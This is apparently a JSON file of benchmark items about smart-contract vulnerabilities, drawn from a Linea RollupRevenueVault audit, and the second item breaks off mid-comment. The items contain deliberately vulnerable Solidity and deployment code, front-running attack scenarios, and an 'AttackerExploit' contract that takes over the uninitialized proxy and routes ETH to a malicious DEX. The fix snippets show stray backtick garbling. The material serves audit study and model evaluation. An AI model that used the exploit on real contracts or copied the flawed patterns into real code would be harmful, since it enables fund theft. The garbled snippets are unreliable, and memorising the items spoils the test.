[
  {
    "id": "gs_diligence_linea_001",
    "subset": "gold_standard",
    "language": "solidity",
    "chain": "ethereum",
    "source_platform": "consensys_diligence",
    "source_report": "Linea Burn Mechanism - October 2025",
    "source_finding_id": "4.1",
    "report_url": "https://diligence.consensys.io/audits/2025/10/linea-burn-mechanism/",
    "github_repo_url": "https://github.com/Consensys/linea-monorepo",
    "contest_date": "2025-10-13",
    "severity": "high",
    "vulnerability_type": "initialization_failure",
    "difficulty_tier": 2,
    "context_level": "cross_contract",
    "finding_title": "Deployment Script Leaves Contract Uninitialized; fallback Does Not Enforce msg.value > 0",
    "finding_description": "The deployment script for RollupRevenueVault incorrectly attempts to call a non-existent initialize() function with no parameters, leaving the contract uninitialized and non-functional. The script specifies an empty initializer signature 'initialize()', but the RollupRevenueVault contract only defines an initialize() function that requires 10 parameters. When OpenZeppelin's deployProxy executes this empty initializer, the call is routed to the contract's fallback function instead of performing proper initialization. As a result, the contract remains uninitialized, allowing anyone to claim it by calling the actual initialize function and gaining full control including DEFAULT_ADMIN_ROLE. Additionally, the fallback function accepts ETH without enforcing msg.value > 0, which could allow zero-value calls that trigger unintended events.",
    "attack_scenario": "1. Deployment script calls deployUpgradableFromFactory with initializer: 'initialize()' (no parameters)\n2. The proxy is deployed successfully and the initializer call is made\n3. Contract has no zero-parameter initialize() function, so the call routes to fallback()\n4. fallback() executes successfully (emits EthReceived event) without initializing state\n5. Contract appears deployed but is completely uninitialized:\n   - No roles are granted (no admin, no invoice submitter, no burner)\n   - Critical addresses are not set (tokenBridge, messageService, l1LineaTokenBurner, lineaToken, dex all zero)\n   - lastInvoiceDate is 0\n6. Attacker monitors mempool or block explorer and detects the uninitialized contract\n7. Attacker front-runs or immediately calls the real initialize() function with their own parameters\n8. Attacker grants themselves DEFAULT_ADMIN_ROLE, INVOICE_SUBMITTER_ROLE, BURNER_ROLE\n9. Attacker sets all critical contract addresses to their controlled contracts\n10. Attacker now controls: invoice submission, burn operations, DEX routing, token bridging\n11. Attacker can drain any ETH sent to the contract or manipulate the burn mechanism\n12. Even if detected, the contract is permanently compromised as initialization cannot be repeated",
    "fix_description": "The fix requires three changes:\n\n1. **Fix the deployment script** to call the correct initialize function with all required parameters:\n````typescript\nconst contract `= await deployUpgradableFromFactory(`\n  contractName`,`\n  `[`\n    lastInvoiceDate`,`\n    defaultAdmin`,`\n    invoiceSubmitter`,`\n    burner`,`\n    invoicePaymentReceiver`,`\n    tokenBridge`,`\n    messageService`,`\n    l1LineaTokenBurner`,`\n    lineaToken`,`\n    dex\n  `],`\n  `{`\n    initializer`: \"initialize(uint256,address,address,address,address,address,address,address,address,address)\",`\n    unsafeAllow`: [\"constructor\"],`\n  `}`\n`);`\n````\n\n2. **Add validation to fallback()** to prevent zero-value calls:\n````solidity\nfallback`() external payable {`\n  require`(`msg.value` > 0, NoEthSent());`\n  emit EthReceived`(`msg.value`);`\n`}`\n````\n\n3. **Bundle with reinitializer** to avoid another front-running window if upgrading an existing deployment:\n````solidity\n`/`/ In upgrade transaction`,` call upgradeToAndCall with reinitializer\nproxy.upgradeToAndCall`(`\n  newImplementation`,`\n  abi.encodeWithSelector`(`\n    RollupRevenueVault.initializeRolesAndStorageVariables.selector`,`\n    params...\n  `)`\n`);`\n````",
    "primary_file": {
      "path": "contracts/src/operational/RollupRevenueVault.sol",
      "content": "// SPDX-License-Identifier: AGPL-3.0\npragma solidity 0.8.26;\n\nimport {AccessControlUpgradeable} from \"@openzeppelin/contracts-upgradeable/access/AccessControlUpgradeable.sol\";\nimport {Initializable} from \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\nimport {TokenBridge} from \"../TokenBridge.sol\";\nimport {L2MessageService} from \"../messageService/l2/L2MessageService.sol\";\n\n/**\n * @title RollupRevenueVault\n * @notice Handles sequencer revenue collection, invoice management, and profit burning\n * @dev Upgradeable contract with role-based access control\n * VULNERABILITY: Deployment script calls wrong initialize signature\n */\ncontract RollupRevenueVault is Initializable, AccessControlUpgradeable {\n  bytes32 public constant INVOICE_SUBMITTER_ROLE = keccak256(\"INVOICE_SUBMITTER_ROLE\");\n  bytes32 public constant BURNER_ROLE = keccak256(\"BURNER_ROLE\");\n\n  uint256 public lastInvoiceDate;\n  uint256 public invoiceArrears;\n  address public invoicePaymentReceiver;\n  \n  TokenBridge public tokenBridge;\n  L2MessageService public messageService;\n  address public l1LineaTokenBurner;\n  address public lineaToken;\n  address public dex;\n\n  event EthReceived(uint256 amount);\n  event InvoiceSubmitted(uint256 startTime, uint256 endTime, uint256 amount);\n  event BurnExecuted(uint256 ethBurned, uint256 lineaAcquired);\n\n  error ZeroTimestampNotAllowed();\n  error ZeroAddressNotAllowed();\n  error NoEthSent();\n  error InsufficientBalance();\n  error InvalidInvoiceSequence();\n\n  /// @custom:oz-upgrades-unsafe-allow constructor\n  constructor() {\n    _disableInitializers();\n  }\n\n  /**\n   * @notice Initializes the contract state\n   * @param _lastInvoiceDate Timestamp of the last invoice\n   * @param _defaultAdmin Address to be granted the default admin role\n   * @param _invoiceSubmitter Address to be granted the invoice submitter role\n   * @param _burner Address to be granted the burner role\n   * @param _invoicePaymentReceiver Address to receive invoice payments\n   * @param _tokenBridge Address of the token bridge contract\n   * @param _messageService Address of the L2 message service contract\n   * @param _l1LineaTokenBurner Address of the L1 LINEA token burner contract\n   * @param _lineaToken Address of the LINEA token contract\n   * @param _dex Address of the DEX contract\n   * @dev VULNERABILITY: Deployment script calls initialize() with no parameters\n   *      This function signature doesn't match, causing call to route to fallback()\n   */\n  function initialize(\n    uint256 _lastInvoiceDate,\n    address _defaultAdmin,\n    address _invoiceSubmitter,\n    address _burner,\n    address _invoicePaymentReceiver,\n    address _tokenBridge,\n    address _messageService,\n    address _l1LineaTokenBurner,\n    address _lineaToken,\n    address _dex\n  ) external initializer {\n    __AccessControl_init();\n    __RollupRevenueVault_init(\n      _lastInvoiceDate,\n      _defaultAdmin,\n      _invoiceSubmitter,\n      _burner,\n      _invoicePaymentReceiver,\n      _tokenBridge,\n      _messageService,\n      _l1LineaTokenBurner,\n      _lineaToken,\n      _dex\n    );\n  }\n\n  /**\n   * @notice Reinitializes the contract state for upgrade\n   * @dev Used when upgrading to a new implementation version\n   */\n  function initializeRolesAndStorageVariables(\n    uint256 _lastInvoiceDate,\n    address _defaultAdmin,\n    address _invoiceSubmitter,\n    address _burner,\n    address _invoicePaymentReceiver,\n    address _tokenBridge,\n    address _messageService,\n    address _l1LineaTokenBurner,\n    address _lineaToken,\n    address _dex\n  ) external reinitializer(2) {\n    __AccessControl_init();\n    __RollupRevenueVault_init(\n      _lastInvoiceDate,\n      _defaultAdmin,\n      _invoiceSubmitter,\n      _burner,\n      _invoicePaymentReceiver,\n      _tokenBridge,\n      _messageService,\n      _l1LineaTokenBurner,\n      _lineaToken,\n      _dex\n    );\n  }\n\n  /**\n   * @notice Internal initialization logic\n   * @dev Shared between initialize and reinitialize functions\n   */\n  function __RollupRevenueVault_init(\n    uint256 _lastInvoiceDate,\n    address _defaultAdmin,\n    address _invoiceSubmitter,\n    address _burner,\n    address _invoicePaymentReceiver,\n    address _tokenBridge,\n    address _messageService,\n    address _l1LineaTokenBurner,\n    address _lineaToken,\n    address _dex\n  ) internal onlyInitializing {\n    require(_lastInvoiceDate != 0, ZeroTimestampNotAllowed());\n    require(_defaultAdmin != address(0), ZeroAddressNotAllowed());\n    require(_invoiceSubmitter != address(0), ZeroAddressNotAllowed());\n    require(_burner != address(0), ZeroAddressNotAllowed());\n    require(_invoicePaymentReceiver != address(0), ZeroAddressNotAllowed());\n    require(_tokenBridge != address(0), ZeroAddressNotAllowed());\n    require(_messageService != address(0), ZeroAddressNotAllowed());\n    require(_l1LineaTokenBurner != address(0), ZeroAddressNotAllowed());\n    require(_lineaToken != address(0), ZeroAddressNotAllowed());\n    require(_dex != address(0), ZeroAddressNotAllowed());\n\n    _grantRole(DEFAULT_ADMIN_ROLE, _defaultAdmin);\n    _grantRole(INVOICE_SUBMITTER_ROLE, _invoiceSubmitter);\n    _grantRole(BURNER_ROLE, _burner);\n\n    lastInvoiceDate = _lastInvoiceDate;\n    invoicePaymentReceiver = _invoicePaymentReceiver;\n    tokenBridge = TokenBridge(_tokenBridge);\n    messageService = L2MessageService(_messageService);\n    l1LineaTokenBurner = _l1LineaTokenBurner;\n    lineaToken = _lineaToken;\n    dex = _dex;\n  }\n\n  /**\n   * @notice Submit an invoice for operational expenses\n   * @param _startTimestamp Start of invoice period\n   * @param _endTimestamp End of invoice period\n   * @param _amount Amount to be paid\n   */\n  function submitInvoice(\n    uint256 _startTimestamp,\n    uint256 _endTimestamp,\n    uint256 _amount\n  ) external onlyRole(INVOICE_SUBMITTER_ROLE) {\n    require(_startTimestamp == lastInvoiceDate + 1, InvalidInvoiceSequence());\n    \n    uint256 availableBalance = address(this).balance;\n    \n    if (availableBalance >= _amount + invoiceArrears) {\n      uint256 totalPayment = _amount + invoiceArrears;\n      invoiceArrears = 0;\n      (bool success, ) = invoicePaymentReceiver.call{value: totalPayment}(\"\");\n      require(success, \"Payment failed\");\n    } else {\n      invoiceArrears += _amount;\n      if (availableBalance > 0) {\n        invoiceArrears -= availableBalance;\n        (bool success, ) = invoicePaymentReceiver.call{value: availableBalance}(\"\");\n        require(success, \"Payment failed\");\n      }\n    }\n    \n    lastInvoiceDate = _endTimestamp;\n    emit InvoiceSubmitted(_startTimestamp, _endTimestamp, _amount);\n  }\n\n  /**\n   * @notice Execute burn and bridge operation\n   * @param _swapData Encoded swap data for DEX\n   */\n  function burnAndBridge(bytes calldata _swapData) external onlyRole(BURNER_ROLE) {\n    require(invoiceArrears == 0, \"Arrears must be zero\");\n    \n    uint256 availableEth = address(this).balance;\n    require(availableEth > 0, InsufficientBalance());\n    \n    // Burn 20% of ETH\n    uint256 ethToBurn = (availableEth * 20) / 100;\n    (bool burnSuccess, ) = address(0).call{value: ethToBurn}(\"\");\n    require(burnSuccess, \"ETH burn failed\");\n    \n    // Swap remaining 80% for LINEA tokens\n    uint256 ethToSwap = availableEth - ethToBurn;\n    (bool swapSuccess, bytes memory swapResult) = dex.call{value: ethToSwap}(_swapData);\n    require(swapSuccess, \"Swap failed\");\n    \n    uint256 lineaAcquired = abi.decode(swapResult, (uint256));\n    \n    // Bridge LINEA tokens to L1\n    IERC20(lineaToken).approve(address(tokenBridge), lineaAcquired);\n    tokenBridge.bridgeToken(\n      lineaToken,\n      lineaAcquired,\n      l1LineaTokenBurner\n    );\n    \n    emit BurnExecuted(ethToBurn, lineaAcquired);\n  }\n\n  /**\n   * @notice Update DEX address\n   * @param _newDex New DEX contract address\n   */\n  function updateDex(address _newDex) external onlyRole(DEFAULT_ADMIN_ROLE) {\n    require(_newDex != address(0), ZeroAddressNotAllowed());\n    require(_newDex != dex, \"Same address\");\n    dex = _newDex;\n  }\n\n  /**\n   * @notice Receive function - Receives Funds\n   * @dev Allows contract to accept ETH transfers\n   */\n  receive() external payable {\n    emit EthReceived(msg.value);\n  }\n\n  /**\n   * @notice Fallback function - Receives Funds\n   * @dev VULNERABILITY: Does not enforce msg.value > 0\n   *      Also, deployment script mistakenly calls this instead of initialize()\n   *      When deployProxy calls 'initialize()' with no params, it routes here\n   *      because no matching function signature exists\n   */\n  fallback() external payable {\n    // BUG: Missing require(msg.value > 0, NoEthSent());\n    // This allows zero-value calls to succeed and emit events\n    // More critically, deployment script calls route here, appearing to succeed\n    // while leaving the contract completely uninitialized\n    emit EthReceived(msg.value);\n  }\n}\n\ninterface IERC20 {\n  function approve(address spender, uint256 amount) external returns (bool);\n}\n\n/**\n * @title AttackerExploit\n * @notice Demonstrates the uninitialized contract takeover\n */\ncontract AttackerExploit {\n  RollupRevenueVault public vault;\n  \n  constructor(address _vaultProxy) {\n    vault = RollupRevenueVault(payable(_vaultProxy));\n  }\n  \n  /**\n   * @notice Exploit the uninitialized contract\n   * @dev After deployment script fails to initialize, anyone can claim it\n   */\n  function exploit() external {\n    // Contract was deployed but initialize() call routed to fallback\n    // Now we can initialize with our own parameters\n    \n    address attacker = msg.sender;\n    address maliciousDex = address(this); // Our controlled DEX\n    address maliciousL1Burner = address(this);\n    \n    // Initialize with attacker as admin and all roles\n    vault.initialize(\n      block.timestamp, // lastInvoiceDate\n      attacker, // defaultAdmin - gives us full control\n      attacker, // invoiceSubmitter\n      attacker, // burner\n      attacker, // invoicePaymentReceiver - we receive all payments\n      address(0x1), // dummy tokenBridge\n      address(0x2), // dummy messageService\n      maliciousL1Burner, // our controlled L1 burner\n      address(0x3), // dummy lineaToken\n      maliciousDex // our controlled DEX - we can steal all ETH\n    );\n    \n    // Now we control the entire contract:\n    // - Can submit fake invoices and receive payments\n    // - Can execute burns that route through our malicious DEX\n    // - Can update critical addresses at will\n    // - All ETH sent to the vault is under our control\n  }\n  \n  /**\n   * @notice Malicious DEX swap function\n   * @dev Steals all ETH sent for \"swapping\"\n   */\n  fallback() external payable {\n    // Pretend to swap but just keep the ETH\n    // Return fake LINEA token amount\n  }\n}",
      "vulnerable_lines": [
        282,
        283,
        284,
        285,
        286,
        287,
        288
      ],
      "vulnerable_functions": [
        "fallback"
      ]
    },
    "context_files": [
      {
        "path": "contracts/deploy/18_deploy_RollupRevenueVault.ts",
        "content": "import { HardhatRuntimeEnvironment } from \"hardhat/types\";\nimport { DeployFunction } from \"hardhat-deploy/types\";\nimport { deployUpgradableFromFactory, getDeployedContractAddress } from \"./utils\";\n\n/**\n * @notice Deployment script for RollupRevenueVault\n * @dev VULNERABILITY: Calls wrong initialize signature\n */\nconst func: DeployFunction = async function (hre: HardhatRuntimeEnvironment) {\n  const { deployments } = hre;\n  const { deploy } = deployments;\n\n  // Contract configuration\n  const contractName = \"RollupRevenueVault\";\n  const existingContractAddress = await getDeployedContractAddress(contractName, deployments);\n\n  // BUG: Empty initializer signature\n  // This constant suggests calling initialize() with no parameters\n  const EMPTY_INITIALIZE_SIGNATURE = \"initialize()\";\n\n  console.log(`Deploying ${contractName}...`);\n\n  // VULNERABILITY: deployProxy is called with empty initializer\n  // The contract has no zero-parameter initialize() function\n  // This causes the call to route to fallback() instead\n  const contract = await deployUpgradableFromFactory(\n    contractName,\n    [], // Empty parameters array\n    {\n      initializer: EMPTY_INITIALIZE_SIGNATURE, // Wrong signature!\n      unsafeAllow: [\"constructor\"],\n    }\n  );\n\n  console.log(`${contractName} deployed to:`, contract.address);\n  \n  // Deployment appears successful because fallback() doesn't revert\n  // But the contract is completely uninitialized:\n  // - No roles granted\n  // - All addresses are zero\n  // - lastInvoiceDate is 0\n  // - Anyone can now call the real initialize() and take control\n\n  return true;\n};\n\nexport default func;\nfunc.tags = [\"RollupRevenueVault\"];\n\n/**\n * @notice CORRECT deployment script\n */\n/*\nconst CORRECT_INITIALIZE_SIGNATURE = \n  \"initialize(uint256,address,address,address,address,address,address,address,address,address)\";\n\nconst contract = await deployUpgradableFromFactory(\n  contractName,\n  [\n    lastInvoiceDate,\n    defaultAdmin,\n    invoiceSubmitter,\n    burner,\n    invoicePaymentReceiver,\n    tokenBridge,\n    messageService,\n    l1LineaTokenBurner,\n    lineaToken,\n    dex\n  ],\n  {\n    initializer: CORRECT_INITIALIZE_SIGNATURE,\n    unsafeAllow: [\"constructor\"],\n  }\n);\n*/",
        "relevance": "This deployment script contains the critical bug that causes the vulnerability. It attempts to call initialize() with no parameters, which doesn't match any function signature in the contract. OpenZeppelin's deployProxy executes this call, but since no matching function exists, it routes to the fallback() function. The fallback succeeds (emitting an event), making the deployment appear successful while the contract remains completely uninitialized and vulnerable to takeover."
      }
    ],
    "call_flow": "DeployScript.deployUpgradableFromFactory() -> OpenZeppelin deployProxy() -> calls proxy.initialize() with no params -> no matching function signature in implementation -> EVM routes call to fallback() -> fallback() emits EthReceived(0) and returns success -> deployment appears successful but contract is uninitialized -> Attacker.exploit() -> calls real initialize() with attacker parameters -> attacker gains full control",
    "context_hint": "This vulnerability combines two critical issues: (1) a deployment script bug that calls the wrong function signature, and (2) a permissive fallback function that doesn't validate its inputs. The deployment script's EMPTY_INITIALIZE_SIGNATURE constant creates a mismatch - it tries to call 'initialize()' but the contract only has 'initialize(uint256,address,address,address,address,address,address,address,address,address)'. In Solidity, when a function call doesn't match any signature, the fallback function is invoked. Since fallback() doesn't revert, the deployment succeeds from the script's perspective. However, the Initializable modifier's state remains untouched - the contract thinks it has never been initialized. This creates a critical window where anyone can call the real initialize() function and gain complete control. The severity is amplified because: (1) This is a revenue management contract handling ETH and token burns, (2) The attacker gains DEFAULT_ADMIN_ROLE enabling unlimited access, (3) They can set malicious DEX and bridge addresses to steal funds, (4) The bug is hidden because deployment \"succeeds\", (5) In production, this would likely be detected only after funds are at risk. The fallback's lack of msg.value > 0 validation is a secondary issue but contributes to hiding the bug.",
    "is_vulnerable": true,
    "expert_notes": "This represents a critical initialization vulnerability pattern that has caused major incidents in production. Key insights: (1) The bug demonstrates why initialization must happen atomically with deployment - any gap creates a front-running window, (2) OpenZeppelin's upgradeable proxies are powerful but require exact function signature matching - typos or mismatches can fail silently, (3) Fallback functions can mask initialization failures by succeeding when they shouldn't, (4) TypeScript/JavaScript deployment scripts lack compile-time type checking for Solidity function signatures, (5) The Initializable modifier's state management is separate from function routing - fallback calls don't trigger it. Historical parallels: Parity Wallet hack ($280M) where uninitialized wallets were taken over, Wormhole bridge attack ($320M) involved initialization issues. Defense strategies: (1) Use OpenZeppelin's hardhat-upgrades plugin which validates initializer signatures, (2) Add deployment verification tests that check state after deployment, (3) Use CREATE2 for deterministic deployment addresses, (4) Remove fallback functions from upgradeable contracts unless absolutely necessary, and if needed, add strict validation."
  },
  {
    "id": "gs_diligence_linea_002",
    "subset": "gold_standard",
    "language": "solidity",
    "chain": "ethereum",
    "source_platform": "consensys_diligence",
    "source_report": "Linea Burn Mechanism - October 2025",
    "source_finding_id": "4.2",
    "report_url": "https://diligence.consensys.io/audits/2025/10/linea-burn-mechanism/",
    "github_repo_url": "https://github.com/Consensys/linea-monorepo",
    "contest_date": "2025-10-13",
    "severity": "high",
    "vulnerability_type": "access_control",
    "difficulty_tier": 3,
    "context_level": "single_file",
    "finding_title": "Deployment and Initialization Flow Creates Front-Running Vulnerability",
    "finding_description": "The RollupRevenueVault contract implements two initialization functions: initialize() with the initializer modifier for initial deployment, and initializeRolesAndStorageVariables() with reinitializer(2) for upgrades. The reinitializer(2) function becomes available immediately after the first initialization, creating a critical vulnerability window. If the upgrade process doesn't atomically call the reinitializer in the same transaction as the upgrade, an attacker can front-run the reinitialization and gain control. Additionally, both functions call the same internal __RollupRevenueVault_init() logic, which inappropriately resets critical state variables and grants roles additively without revoking existing ones during upgrades. This can lead to privilege accumulation, state inconsistencies, and unauthorized access.",
    "attack_scenario": "1. RollupRevenueVault V1 is deployed and properly initialized with legitimate admin\n2. Protocol decides to upgrade to V2 with new features\n3. Admin executes upgradeTo(V2Implementation) transaction\n4. V2 implementation is now active, but not yet reinitialized\n5. Attacker monitors mempool and sees the upgrade transaction\n6. Attacker immediately submits initializeRolesAndStorageVariables() transaction with high gas price\n7. Attacker's transaction gets mined before the legitimate reinitialization\n8. Attacker passes their own addresses for all parameters:\n   - _defaultAdmin = attacker (grants DEFAULT_ADMIN_ROLE)\n   - _invoiceSubmitter = attacker (grants INVOICE_SUBMITTER_ROLE)\n   - _burner = attacker (grants BURNER_ROLE)\n9. __RollupRevenueVault_init() executes, granting roles to attacker\n10. Original admins still have their roles (roles are additive, not replaced)\n11. Attacker now has equal privileges to original admins\n12. Attacker can: submit fake invoices, execute burns to malicious DEX, update critical addresses\n13. Even worse, if attacker manages to call updateDex() first, they can redirect all burns\n14. The lastInvoiceDate gets reset, breaking invoice accounting continuity\n15. Token and bridge addresses get reset, potentially breaking integrations\n16. Protocol is compromised and requires emergency response",
    "fix_description": "The fix requires multiple changes to eliminate the vulnerability:\n\n1. **Atomic Upgrade and Reinitialization**:\n````solidity\n`/`/ Use upgradeToAndCall instead of separate transactions\nproxy.upgradeToAndCall`(`\n  newImplementation`,`\n  abi.encodeWithSelector`(`\n    RollupRevenueVault.initializeRolesAndStorageVariables.selector`,`\n    lastInvoiceDate`,`\n    defaultAdmin`,`\n    `/`/ ... all parameters\n  `)`\n`);`\n````\n\n2. **Separate Initialization Logic for Upgrades**:\n````solidity\n`/`/ Create upgrade-specific reinitialization that only updates necessary parameters\nfunction initializeV2Upgrade`(`\n  address _newDexIfNeeded`,`\n  address _newFeatureAddress\n`) external reinitializer(2) {`\n  `/`/ Only update what changed in V2\n  `/`/ Do NOT reset critical state like lastInvoiceDate\n  `/`/ Do NOT re-grant existing roles\n  if `(_newDexIfNeeded != address(0)) {`\n    dex `= _newDexIfNeeded;`\n  `}`\n  `/`/ Initialize only new V2 features\n`}`\n````\n\n3. **Role Management for Upgrades**:\n````solidity\n`/`/ Explicitly revoke old roles before granting new ones\nfunction _updateRoles`(`\n  address _oldAdmin`,`\n  address _newAdmin`,`\n  address _oldSubmitter`,`\n  address _newSubmitter`,`\n  address _oldBurner`,`\n  address _newBurner\n`) internal {`\n  `/`/ Revoke old roles first\n  if `(_oldAdmin != address(0)) {`\n    _revokeRole`(DEFAULT_ADMIN_ROLE, _oldAdmin);`\n  `}`\n  `/`/ Then grant new roles\n  _grantRole`(DEFAULT_ADMIN_ROLE, _newAdmin);`\n  `/`/ Repeat for other roles\n`}`\n````\n\n4. **Preserve Critical State**:\n````solidity\n`/`/ Do NOT reset these in reinitializer`:`\n`/`/ - lastInvoiceDate `(breaks accounting)`\n`/`/ - lineaToken `(breaks token operations)`\n`/`/ - tokenBridge `(breaks bridging)`\n`/`/ - messageService `(breaks messaging)`\n````\n\nImplemented fix (from commit 831c529479faebb380df1478e17f03bf0a3b9b80):\n- Modified deployment to call correct initialize function atomically\n- Changed upgrade flow to use upgradeAndCall with direct reinitializer call\n- Added require(msg.value > 0) to fallback\n- reinitializer(2) now prevents any future initialize() calls",
    "primary_file": {
      "path": "contracts/src/operational/RollupRevenueVault.sol",
      "content": "// SPDX-License-Identifier: AGPL-3.0\npragma solidity 0.8.26;\n\nimport {AccessControlUpgradeable} from \"@openzeppelin/contracts-upgradeable/access/AccessControlUpgradeable.sol\";\nimport {Initializable} from \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\";\nimport {TokenBridge} from \"../TokenBridge.sol\";\nimport {L2MessageService} from \"../messageService/l2/L2MessageService.sol\";\n\n/**\n * @title RollupRevenueVault\n * @notice Handles sequencer revenue collection, invoice management, and profit burning\n * @dev Upgradeable contract with role-based access control\n * VULNERABILITY: Deployment script calls wrong initialize signature\n */\ncontract RollupRevenueVault is Initializable, AccessControlUpgradeable {\n  bytes32 public constant INVOICE_SUBMITTER_ROLE = keccak256(\"INVOICE_SUBMITTER_ROLE\");\n  bytes32 public constant BURNER_ROLE = keccak256(\"BURNER_ROLE\");\n\n  uint256 public lastInvoiceDate;\n  uint256 public invoiceArrears;\n  address public invoicePaymentReceiver;\n  \n  TokenBridge public tokenBridge;\n  L2MessageService public messageService;\n  address public l1LineaTokenBurner;\n  address public lineaToken;\n  address public dex;\n\n  event EthReceived(uint256 amount);\n  event InvoiceSubmitted(uint256 startTime, uint256 endTime, uint256 amount);\n  event BurnExecuted(uint256 ethBurned, uint256 lineaAcquired);\n\n  error ZeroTimestampNotAllowed();\n  error ZeroAddressNotAllowed();\n  error NoEthSent();\n  error InsufficientBalance();\n  error InvalidInvoiceSequence();\n\n  /// @custom:oz-upgrades-unsafe-allow constructor\n  constructor() {\n    _disableInitializers();\n  }\n\n  /**\n   * @notice Initializes the contract state\n   * @param _lastInvoiceDate Timestamp of the last invoice\n   * @param _defaultAdmin Address to be granted the default admin role\n   * @param _invoiceSubmitter Address to be granted the invoice submitter role\n   * @param _burner Address to be granted the burner role\n   * @param _invoicePaymentReceiver Address to receive invoice payments\n   * @param _tokenBridge Address of the token bridge contract\n   * @param _messageService Address of the L2 message service contract\n   * @param _l1LineaTokenBurner Address of the L1 LINEA token burner contract\n   * @param _lineaToken Address of the LINEA token contract\n   * @param _dex Address of the DEX contract\n   * @dev VULNERABILITY: Deployment script calls initialize() with no parameters\n   *      This function signature doesn't match, causing call to route to fallback()\n   */\n  function initialize(\n    uint256 _lastInvoiceDate,\n    address _defaultAdmin,\n    address _invoiceSubmitter,\n    address _burner,\n    address _invoicePaymentReceiver,\n    address _tokenBridge,\n    address _messageService,\n    address _l1LineaTokenBurner,\n    address _lineaToken,\n    address _dex\n  ) external initializer {\n    __AccessControl_init();\n    __RollupRevenueVault_init(\n      _lastInvoiceDate,\n      _defaultAdmin,\n      _invoiceSubmitter,\n      _burner,\n      _invoicePaymentReceiver,\n      _tokenBridge,\n      _messageService,\n      _l1LineaTokenBurner,\n      _lineaToken,\n      _dex\n    );\n  }\n\n  /**\n   * @notice Reinitializes the contract state for upgrade\n   * @dev Used when upgrading to a new implementation version\n   */\n  function initializeRolesAndStorageVariables(\n    uint256 _lastInvoiceDate,\n    address _defaultAdmin,\n    address _invoiceSubmitter,\n    address _burner,\n    address _invoicePaymentReceiver,\n    address _tokenBridge,\n    address _messageService,\n    address _l1LineaTokenBurner,\n    address _lineaToken,\n    address _dex\n  ) external reinitializer(2) {\n    __AccessControl_init();\n    __RollupRevenueVault_init(\n      _lastInvoiceDate,\n      _defaultAdmin,\n      _invoiceSubmitter,\n      _burner,\n      _invoicePaymentReceiver,\n      _tokenBridge,\n      _messageService,\n      _l1LineaTokenBurner,\n      _lineaToken,\n      _dex\n    );\n  }\n\n  /**\n   * @notice Internal initialization logic\n   * @dev Shared between initialize and reinitialize functions\n   */\n  function __RollupRevenueVault_init(\n    uint256 _lastInvoiceDate,\n    address _defaultAdmin,\n    address _invoiceSubmitter,\n    address _burner,\n    address _invoicePaymentReceiver,\n    address _tokenBridge,\n    address _messageService,\n    address _l1LineaTokenBurner,\n    address _lineaToken,\n    address _dex\n  ) internal onlyInitializing {\n    require(_lastInvoiceDate != 0, ZeroTimestampNotAllowed());\n    require(_defaultAdmin != address(0), ZeroAddressNotAllowed());\n    require(_invoiceSubmitter != address(0), ZeroAddressNotAllowed());\n    require(_burner != address(0), ZeroAddressNotAllowed());\n    require(_invoicePaymentReceiver != address(0), ZeroAddressNotAllowed());\n    require(_tokenBridge != address(0), ZeroAddressNotAllowed());\n    require(_messageService != address(0), ZeroAddressNotAllowed());\n    require(_l1LineaTokenBurner != address(0), ZeroAddressNotAllowed());\n    require(_lineaToken != address(0), ZeroAddressNotAllowed());\n    require(_dex != address(0), ZeroAddressNotAllowed());\n\n    _grantRole(DEFAULT_ADMIN_ROLE, _defaultAdmin);\n    _grantRole(INVOICE_SUBMITTER_ROLE, _invoiceSubmitter);\n    _grantRole(BURNER_ROLE, _burner);\n\n    lastInvoiceDate = _lastInvoiceDate;\n    invoicePaymentReceiver = _invoicePaymentReceiver;\n    tokenBridge = TokenBridge(_tokenBridge);\n    messageService = L2MessageService(_messageService);\n    l1LineaTokenBurner = _l1LineaTokenBurner;\n    lineaToken = _lineaToken;\n    dex = _dex;\n  }\n\n  /**\n   * @notice Submit an invoice for operational expenses\n   * @param _startTimestamp Start of invoice period\n   * @param _endTimestamp End of invoice period\n   * @param _amount Amount to be paid\n   */\n  function submitInvoice(\n    uint256 _startTimestamp,\n    uint256 _endTimestamp,\n    uint256 _amount\n  ) external onlyRole(INVOICE_SUBMITTER_ROLE) {\n    require(_startTimestamp == lastInvoiceDate + 1, InvalidInvoiceSequence());\n    \n    uint256 availableBalance = address(this).balance;\n    \n    if (availableBalance >= _amount + invoiceArrears) {\n      uint256 totalPayment = _amount + invoiceArrears;\n      invoiceArrears = 0;\n      (bool success, ) = invoicePaymentReceiver.call{value: totalPayment}(\"\");\n      require(success, \"Payment failed\");\n    } else {\n      invoiceArrears += _amount;\n      if (availableBalance > 0) {\n        invoiceArrears -= availableBalance;\n        (bool success, ) = invoicePaymentReceiver.call{value: availableBalance}(\"\");\n        require(success, \"Payment failed\");\n      }\n    }\n    \n    lastInvoiceDate = _endTimestamp;\n    emit InvoiceSubmitted(_startTimestamp, _endTimestamp, _amount);\n  }\n\n  /**\n   * @notice Execute burn and bridge operation\n   * @param _swapData Encoded swap data for DEX\n   */\n  function burnAndBridge(bytes calldata _swapData) external onlyRole(BURNER_ROLE) {\n    require(invoiceArrears == 0, \"Arrears must be zero\");\n    \n    uint256 availableEth = address(this).balance;\n    require(availableEth > 0, InsufficientBalance());\n    \n    // Burn 20% of ETH\n    uint256 ethToBurn = (availableEth * 20) / 100;\n    (bool burnSuccess, ) = address(0).call{value: ethToBurn}(\"\");\n    require(burnSuccess, \"ETH burn failed\");\n    \n    // Swap remaining 80% for LINEA tokens\n    uint256 ethToSwap = availableEth - ethToBurn;\n    (bool swapSuccess, bytes memory swapResult) = dex.call{value: ethToSwap}(_swapData);\n    require(swapSuccess, \"Swap failed\");\n    \n    uint256 lineaAcquired = abi.decode(swapResult, (uint256));\n    \n    // Bridge LINEA tokens to L1\n    IERC20(lineaToken).approve(address(tokenBridge), lineaAcquired);\n    tokenBridge.bridgeToken(\n      lineaToken,\n      lineaAcquired,\n      l1LineaTokenBurner\n    );\n    \n    emit BurnExecuted(ethToBurn, lineaAcquired);\n  }\n\n  /**\n   * @notice Update DEX address\n   * @param _newDex New DEX contract address\n   */\n  function updateDex(address _newDex) external onlyRole(DEFAULT_ADMIN_ROLE) {\n    require(_newDex != address(0), ZeroAddressNotAllowed());\n    require(_newDex != dex, \"Same address\");\n    dex = _newDex;\n  }\n\n  /**\n   * @notice Receive function - Receives Funds\n   * @dev Allows contract to accept ETH transfers\n   */\n  receive() external payable {\n    emit EthReceived(msg.value);\n  }\n\n  /**\n   * @notice Fallback function - Receives Funds\n   * @dev 